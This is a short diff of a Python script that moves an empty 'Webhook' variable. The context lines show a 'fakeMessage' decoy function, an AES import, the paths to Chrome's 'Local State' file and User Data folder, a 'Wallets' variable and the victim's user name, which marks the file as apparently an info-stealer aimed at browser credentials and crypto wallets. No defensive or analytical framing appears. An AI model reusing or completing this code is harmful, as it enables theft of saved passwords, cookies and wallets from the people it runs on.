@@ -14,7 +14,7 @@ import time
 import socket
 from Cryptodome.Cipher import AES
 
-
+Webhook = ""
 
 
 def fakeMessage():
@@ -51,7 +51,6 @@ def fakeMessage():
 
 CHROME_PATH_LOCAL_STATE = os.path.normpath(r"%s\AppData\Local\Google\Chrome\User Data\Local State"%(os.environ['USERPROFILE']))
 CHROME_PATH = os.path.normpath(r"%s\AppData\Local\Google\Chrome\User Data"%(os.environ['USERPROFILE']))
-Webhook = ""
 Wallets = None
 PCName = os.environ.get( " USERNAME" )
 PortList = []
